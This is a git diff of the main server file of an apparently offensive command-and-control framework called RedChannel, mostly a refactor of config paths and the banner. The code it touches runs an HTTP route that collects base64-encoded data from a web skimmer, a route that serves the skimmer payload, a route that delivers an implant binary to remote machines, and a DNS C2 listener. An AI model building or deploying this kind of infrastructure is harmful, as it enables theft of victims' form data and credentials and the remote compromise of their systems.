@@ -6,16 +6,7 @@ import { Command } from "commander";
 import RedChannel from "./lib/redchannel";
 import UserInterface from "./lib/ui";
 import Logger from "./lib/logger";
-import { Config, Constants, emsg } from "./utils/utils";
-
-const banner = `
-██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
-██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
-██████╔╝█████╗  ██║  ██║██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
-██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
-██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
-╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
-`;
+import { Config, Constants, Banner, emsg } from "./utils/utils";
 
 const cli = new Command();
 cli.version(Constants.VERSION, "-v, --version")
@@ -61,13 +52,14 @@ try {
     redchannel = new RedChannel(cliDebug, cliDomain, cliConfig, cliPassword, cliConfigFilePath);
 } catch (ex) {
     new Logger().error(`Error instantiating RedChannel: ${emsg(ex)}`);
+    console.log(ex);
     process.exit(1);
 }
 
 const ui = new UserInterface(redchannel);
 redchannel.log = ui;
 
-ui.msg(chalk.redBright(banner));
+ui.msg(chalk.redBright(Banner));
 /**
  Web channel
  */
@@ -83,7 +75,7 @@ webServer.listen(redchannel.config.c2.web_port, redchannel.config.c2.web_ip, (er
  */
 
 // incoming skimmer data
-webServer.get(redchannel.config.skimmer.data_route, (request, response) => {
+webServer.get(redchannel.modules.skimmer.config.data_route, (request, response) => {
     ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
 
     const decodedData = Buffer.from(request.query.id, "base64").toString();
@@ -92,7 +84,7 @@ webServer.get(redchannel.config.skimmer.data_route, (request, response) => {
 });
 
 // server skimmer payload
-webServer.get(redchannel.config.skimmer.payload_route, (request, response) => {
+webServer.get(redchannel.modules.skimmer.config.payload_route, (request, response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for skimmer payload from ${ip}`);
     response.send(redchannel.modules.skimmer.payload);
@@ -103,8 +95,8 @@ webServer.get(redchannel.config.c2.binary_route, (request, response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for agent binary from ${ip}`);
     try {
-        if (!fs.existsSync(redchannel.config.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
-        response.sendFile(redchannel.config.implant.output_file);
+        if (!fs.existsSync(redchannel.modules.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
+        response.sendFile(redchannel.modules.implant.output_file);
         ui.warn(`agent binary sent to ${ip}`);
     } catch (ex) {
         ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
@@ -131,3 +123,9 @@ dnsServer
     .listen(redchannel.config.c2.dns_port, redchannel.config.c2.dns_ip);
 
 ui.info(`c2-dns listening on: ${redchannel.config.c2.dns_ip}:${redchannel.config.c2.dns_port}`);
+
+if (redchannel.modules.proxy.config.enabled) {
+    ui.info(`c2-proxy enabled, checkin at interval: ${redchannel.modules.proxy.config.interval}ms`);
+} else {
+    ui.info(`c2-proxy is disabled, see 'use proxy' -> 'help'`);
+}
